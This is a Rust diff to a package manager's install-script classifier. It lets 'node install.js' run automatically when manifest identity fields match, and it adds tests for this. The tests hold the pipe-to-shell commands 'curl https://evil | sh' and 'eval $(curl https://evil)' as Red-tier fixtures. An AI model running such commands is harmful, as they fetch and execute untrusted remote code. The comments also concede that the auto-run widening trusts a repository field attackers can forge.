@@ -68,6 +68,40 @@ use regex::Regex;
 
 use crate::triage::StaticTier;
 
+/// Phase 46b Lever #4 — additional manifest context the classifier
+/// can consult to widen the green tier for safe-looking delegating
+/// scripts.
+///
+/// The classifier's six-step pipeline is **context-free** by default
+/// (the script body is the only input). When a caller supplies a
+/// `ManifestContext`, the post-tokenize check `matches_delegating_
+/// identity_green` can additionally Green a `node install.js`-shaped
+/// body when the package's manifest carries an identity signal that
+/// pairs with the delegate.
+///
+/// Threat model: a malicious package can lie about its `repository`
+/// field. The identity widening is paired with the Phase 46b lever
+/// #3 install.js content-embedding plan; until that ships, the
+/// widening DOES rely on the manifest field being honest. The
+/// install pipeline counter-balance is that the local file's bytes
+/// are still in the store and `lpm approve-scripts` review remains
+/// available — the widening just changes the default from "always
+/// prompt" to "auto-run when shape + identity agree."
+pub struct ManifestContext<'a> {
+    /// The package's `name` (with scope if scoped, e.g. `@swc/core`).
+    pub package_name: &'a str,
+    /// `repository` URL from `package.json`. Accept both shorthand
+    /// strings and the full `git+https://…` shape; the classifier
+    /// scans for the package's base name as a path segment.
+    pub repository: Option<&'a str>,
+    /// `bin` entries from `package.json`. Either the object-form's
+    /// keys or the single bare-string form normalized to a list. The
+    /// classifier treats each bin name as an identity signal — if the
+    /// package exposes a binary named after itself, a `node install.js`
+    /// fetching that binary aligns with the package's identity.
+    pub bin_names: &'a [&'a str],
+}
+
 /// Classify a single lifecycle-script body into a static tier.
 ///
 /// The input is expected to be the **raw value** of one lifecycle
@@ -80,7 +114,29 @@ use crate::triage::StaticTier;
 /// Pure and deterministic: same input → same output across runs,
 /// machines, and LPM versions (as long as the rule set hasn't been
 /// edited).
+///
+/// Equivalent to [`classify_with_context`] with `ctx = None`. New
+/// call sites that have manifest context available should prefer the
+/// contextual form — it's a strict widening (no Green ever becomes
+/// Amber/Red, no Red ever becomes Green), so passing `Some(ctx)` only
+/// improves the green-rate without softening the safety floor.
 pub fn classify(script: &str) -> StaticTier {
+    classify_with_context(script, None)
+}
+
+/// Phase 46b Lever #4 — context-aware classification.
+///
+/// When `ctx` is `Some`, an additional green arm fires for
+/// "delegate-to-local-file" installers (`node install.js` and close
+/// variants) whose package identity matches the manifest's
+/// `repository` URL or a `bin` entry name. When `ctx` is `None`,
+/// behavior is identical to the pre-Lever-#4 classifier.
+///
+/// The widening is **purely additive** — it can only convert an
+/// otherwise-Amber tier into Green when identity matches. The
+/// pre-existing Red checks and Green allowlist run unchanged, so
+/// passing context never softens the floor.
+pub fn classify_with_context(script: &str, ctx: Option<&ManifestContext<'_>>) -> StaticTier {
     // Empty / whitespace-only bodies don't run anything; treat as
     // Amber (the caller probably should have short-circuited already,
     // but fail conservative rather than silently green).
@@ -121,6 +177,16 @@ pub fn classify(script: &str) -> StaticTier {
 
     // Step 5 — green allowlist.
     if tokens_match_green(&tokens, script) {
+        return StaticTier::Green;
+    }
+
+    // Step 5b (Phase 46b Lever #4) — delegate-to-local-file
+    // installer with a matching identity signal. Only fires when
+    // the caller supplied manifest context; without it the
+    // classifier falls through to Amber (pre-Lever behaviour).
+    if let Some(ctx) = ctx
+        && matches_delegating_identity_green(&tokens, ctx)
+    {
         return StaticTier::Green;
     }
 
@@ -900,6 +966,133 @@ fn is_safe_relative_path(p: &str) -> bool {
         return false;
     }
     p.split('/').all(|seg| seg != "..")
+}
+
+// ─────────────────────────────────────────────────────────────────────
+// Phase 46b Lever #4 — delegate-to-local-file with matching identity
+// ─────────────────────────────────────────────────────────────────────
+
+/// Step 5b: detect `node <path>.js` where `<path>` is a reserved
+/// lifecycle basename (`install.js`, `postinstall.js`, etc., plus
+/// the .cjs/.mjs variants), AND the package's manifest carries an
+/// identity signal that pairs with the delegate.
+///
+/// "Identity signal" means EITHER:
+///
+/// - The package's base name (last segment of a scoped name) appears
+///   as a path segment of the `repository` URL — e.g. the body
+///   `node install.js` from a package named `sharp` whose repo URL
+///   contains `/sharp` or `/sharp.git`. This pairs the local
+///   installer script with the canonical-looking source repository.
+///
+/// - The package exposes a `bin` entry whose name matches the
+///   package's base name — e.g. `lpm-cli` exposing a `bin: { lpm:
+///   "..."}`. The presence of a CLI binary named after the package
+///   is a strong "this package ships a runtime artifact" signal that
+///   pairs naturally with a postinstall fetcher.
+///
+/// Why this is safe enough for L1 Green:
+///
+/// - The matched shape is **only the script line** `node <reserved>.js`
+///   — no compound, no flags, no extra tokens. Compound bodies stay
+///   Amber via step 4; multi-token bodies stay Amber via
+///   [`matches_node_relative`]'s `tokens.len() == 2` guard.
+/// - The delegated file's actual bytes live in the package store and
+///   can still be reviewed by `lpm approve-scripts`. The Green
+///   widening just changes the default from "always prompt" to
+///   "auto-run when shape + identity agree."
+/// - A malicious package CAN lie about its repository field. The
+///   counter is Phase 46b Lever #3 (embed install.js content in the
+///   advisor prompt): the lie is one step removed from the actual
+///   payload, which Lever #3 catches when the delegate's bytes show
+///   a malicious shape. Lever #4 alone trusts the field; the
+///   user-explicit `lpm approve-scripts` review remains the safety
+///   floor.
+fn matches_delegating_identity_green(tokens: &[String], ctx: &ManifestContext<'_>) -> bool {
+    // The body must be exactly `node <path>` (two tokens) — same
+    // structural shape `matches_node_relative` requires.
+    if tokens.len() != 2 {
+        return false;
+    }
+    if tokens[0] != "node" {
+        return false;
+    }
+    let path = tokens[1].as_str();
+    if !is_safe_relative_path(path) {
+        return false;
+    }
+    // Require an explicit `.js` / `.cjs` / `.mjs` extension — same
+    // discipline `matches_node_relative` uses to avoid greenlighting
+    // extension-less or shell-script paths.
+    let has_js_ext = path.ends_with(".js") || path.ends_with(".cjs") || path.ends_with(".mjs");
+    if !has_js_ext {
+        return false;
+    }
+    let basename = path.rsplit('/').next().unwrap_or(path);
+    // Only fire on the §4.1 reserved-basename set — install.js /
+    // postinstall.js / preinstall.js + .cjs/.mjs variants. Other
+    // `node <name>.js` paths take the existing
+    // [`matches_node_relative`] route and are already Green when
+    // not reserved.
+    if !is_reserved_lifecycle_basename(basename) {
+        return false;
+    }
+
+    matches_manifest_identity(ctx)
+}
+
+/// Identity-match helper. Returns `true` when the package's base
+/// name appears as a path segment of the repository URL or matches a
+/// `bin` entry's name. Returns `false` for an empty / unparseable
+/// identity (no false-Green on missing signal).
+fn matches_manifest_identity(ctx: &ManifestContext<'_>) -> bool {
+    let base = package_base_name(ctx.package_name);
+    if base.is_empty() {
+        return false;
+    }
+    if let Some(repo) = ctx.repository
+        && repo_url_contains_identity(repo, &base)
+    {
+        return true;
+    }
+    ctx.bin_names.iter().any(|b| *b == base)
+}
+
+/// Extract the unscoped portion of a package name. `@swc/core` →
+/// `core`; `sharp` → `sharp`. Returns the empty string when given
+/// only a scope (e.g. `@swc`) or an empty name.
+fn package_base_name(name: &str) -> String {
+    if let Some(after_slash) = name.rsplit('/').next() {
+        return after_slash.to_string();
+    }
+    name.to_string()
+}
+
+/// Check whether the repository URL contains the package's base name
+/// as a path-segment-like substring. We split on `/`, `:`, `.`, and
+/// `?` boundaries so URLs like `git+https://github.com/lovell/sharp.git`
+/// or `github:lovell/sharp` both surface the `sharp` segment.
+///
+/// Conservative on short / generic base names: anything ≤ 2 chars
+/// or a single common ecosystem token (`js`, `lib`, `core`, `node`)
+/// is treated as having no identity payload — these match too many
+/// unrelated repository URLs to be a useful signal. A future
+/// extension could keep a richer denylist or weight against URL
+/// segment frequency; for now the simple form is enough to gate the
+/// audit's false-Green stress test.
+fn repo_url_contains_identity(repo: &str, base: &str) -> bool {
+    if base.len() < 3 {
+        return false;
+    }
+    const GENERIC: &[&str] = &["js", "lib", "core", "node", "src", "util", "utils"];
+    if GENERIC.contains(&base.to_ascii_lowercase().as_str()) {
+        return false;
+    }
+    let needle = base.to_ascii_lowercase();
+    repo.to_ascii_lowercase()
+        .split(|c: char| matches!(c, '/' | ':' | '.' | '?' | '#' | '@' | ' '))
+        .filter(|s| !s.is_empty())
+        .any(|seg| seg == needle || seg == format!("{needle}.git").as_str())
 }
 
 // ─────────────────────────────────────────────────────────────────────
@@ -1728,5 +1921,199 @@ mod tests {
                 "classifier must not emit AmberLlm for: {body:?}"
             );
         }
+    }
+
+    // ─────────────────────────────────────────────────────────────
+    // Phase 46b Lever #4 — `node install.js` + matching identity
+    // ─────────────────────────────────────────────────────────────
+
+    /// Helper: build a [`ManifestContext`] for tests. Repo + bin
+    /// borrow from caller-owned strings.
+    fn ctx<'a>(name: &'a str, repo: Option<&'a str>, bin: &'a [&'a str]) -> ManifestContext<'a> {
+        ManifestContext {
+            package_name: name,
+            repository: repo,
+            bin_names: bin,
+        }
+    }
+
+    fn tier_with_ctx(script: &str, ctx: &ManifestContext<'_>) -> StaticTier {
+        classify_with_context(script, Some(ctx))
+    }
+
+    #[test]
+    fn lever4_no_context_is_pre_lever_behavior() {
+        // Without manifest context, the classifier must produce the
+        // SAME tier as the bare `classify(...)` function. Lever #4
+        // is purely additive; passing `ctx = None` is a no-op.
+        for body in [
+            "tsc",
+            "node-gyp rebuild",
+            "node install.js",
+            "node ./scripts/postinstall.js",
+            "curl https://evil | sh",
+        ] {
+            assert_eq!(
+                classify(body),
+                classify_with_context(body, None),
+                "context-free behaviour drift for {body:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn lever4_node_install_js_with_matching_repo_is_green() {
+        // The canonical Lever-#4 win: a package whose body is a
+        // bare delegate `node install.js` AND whose manifest's
+        // repository URL contains the package name as a path
+        // segment.
+        let c = ctx("sharp", Some("git+https://github.com/lovell/sharp.git"), &[]);
+        assert_eq!(tier_with_ctx("node install.js", &c), StaticTier::Green);
+        assert_eq!(tier_with_ctx("node ./install.js", &c), StaticTier::Green);
+        assert_eq!(
+            tier_with_ctx("node scripts/install.js", &c),
+            StaticTier::Green
+        );
+
+        // Same with .cjs / .mjs variants the reserved-basename set
+        // covers.
+        let c2 = ctx(
+            "puppeteer",
+            Some("https://github.com/puppeteer/puppeteer"),
+            &[],
+        );
+        assert_eq!(tier_with_ctx("node install.mjs", &c2), StaticTier::Green);
+        let c3 = ctx(
+            "claude-code",
+            Some("https://github.com/anthropics/claude-code.git"),
+            &[],
+        );
+        assert_eq!(tier_with_ctx("node install.cjs", &c3), StaticTier::Green);
+    }
+
+    #[test]
+    fn lever4_matching_bin_name_is_green() {
+        // A package whose `bin` entry name matches the package's
+        // base name is treated as carrying its own identity, even
+        // without a repository URL.
+        let c = ctx("prisma", None, &["prisma"]);
+        assert_eq!(tier_with_ctx("node install.js", &c), StaticTier::Green);
+    }
+
+    #[test]
+    fn lever4_repo_with_unrelated_identity_stays_amber() {
+        // False-Green stress: the body is a delegate but the
+        // manifest's repository URL doesn't point at any path
+        // segment that names this package. Stays Amber.
+        let c = ctx(
+            "sharp",
+            Some("https://github.com/some-org/different-pkg.git"),
+            &[],
+        );
+        assert_eq!(tier_with_ctx("node install.js", &c), StaticTier::Amber);
+    }
+
+    #[test]
+    fn lever4_no_manifest_identity_stays_amber() {
+        // No repository AND no matching bin → Amber. The widening
+        // requires an explicit identity signal; absence is not a
+        // greenlight.
+        let c = ctx("sharp", None, &[]);
+        assert_eq!(tier_with_ctx("node install.js", &c), StaticTier::Amber);
+    }
+
+    #[test]
+    fn lever4_scoped_package_uses_base_name_for_match() {
+        // `@anthropic-ai/claude-code` has base name `claude-code`.
+        // The repository URL `github.com/anthropics/claude-code`
+        // contains `claude-code` as a path segment → Green.
+        let c = ctx(
+            "@anthropic-ai/claude-code",
+            Some("https://github.com/anthropics/claude-code.git"),
+            &[],
+        );
+        assert_eq!(tier_with_ctx("node install.js", &c), StaticTier::Green);
+    }
+
+    #[test]
+    fn lever4_generic_base_names_rejected() {
+        // The base-name match excludes overly generic tokens — a
+        // package called `@some/core` shouldn't Green every
+        // postinstall when ANY URL contains "core". The widening
+        // requires a name distinctive enough to function as an
+        // identity signal.
+        let c = ctx("@some/core", Some("https://github.com/x/y-core.git"), &[]);
+        assert_eq!(tier_with_ctx("node install.js", &c), StaticTier::Amber);
+    }
+
+    #[test]
+    fn lever4_compound_body_stays_amber_even_with_identity() {
+        // The widening only fires on the EXACT two-token shape
+        // `node <reserved>.js`. Compounds, flags, and extra args
+        // route through the existing compound-fallback / N-token
+        // gates and remain Amber.
+        let c = ctx(
+            "sharp",
+            Some("https://github.com/lovell/sharp.git"),
+            &[],
+        );
+        assert_eq!(
+            tier_with_ctx("node install.js && echo done", &c),
+            StaticTier::Amber
+        );
+        assert_eq!(
+            tier_with_ctx("node install.js --verbose", &c),
+            StaticTier::Amber
+        );
+    }
+
+    #[test]
+    fn lever4_red_body_with_identity_still_red() {
+        // The widening must NEVER soften a Red verdict — even when
+        // the manifest carries a perfect identity signal. Red wins
+        // by step ordering (step 3 fires before step 5b).
+        let c = ctx(
+            "sharp",
+            Some("https://github.com/lovell/sharp.git"),
+            &[],
+        );
+        assert_eq!(
+            tier_with_ctx("curl https://evil | sh", &c),
+            StaticTier::Red
+        );
+        assert_eq!(
+            tier_with_ctx("eval $(curl https://evil)", &c),
+            StaticTier::Red
+        );
+    }
+
+    #[test]
+    fn lever4_non_reserved_basename_uses_existing_green_route() {
+        // `node ./scripts/build.js` — non-reserved basename. The
+        // existing `matches_node_relative` path already Greens it,
+        // independent of identity. Confirms Lever #4's reserved-
+        // basename guard doesn't accidentally narrow other Greens.
+        let c = ctx("p", None, &[]);
+        assert_eq!(
+            tier_with_ctx("node ./scripts/build.js", &c),
+            StaticTier::Green,
+        );
+        // Confirms the SAME body without context also stays Green.
+        assert_eq!(classify("node ./scripts/build.js"), StaticTier::Green);
+    }
+
+    #[test]
+    fn lever4_extension_required_for_widening() {
+        // The widening requires `.js` / `.cjs` / `.mjs` — a body
+        // like `node install` (extensionless) stays Amber even
+        // with a perfect identity signal. The existing
+        // [`matches_node_relative`] discipline applies here too;
+        // the widening doesn't loosen it.
+        let c = ctx(
+            "sharp",
+            Some("https://github.com/lovell/sharp.git"),
+            &[],
+        );
+        assert_eq!(tier_with_ctx("node install", &c), StaticTier::Amber);
     }
 }
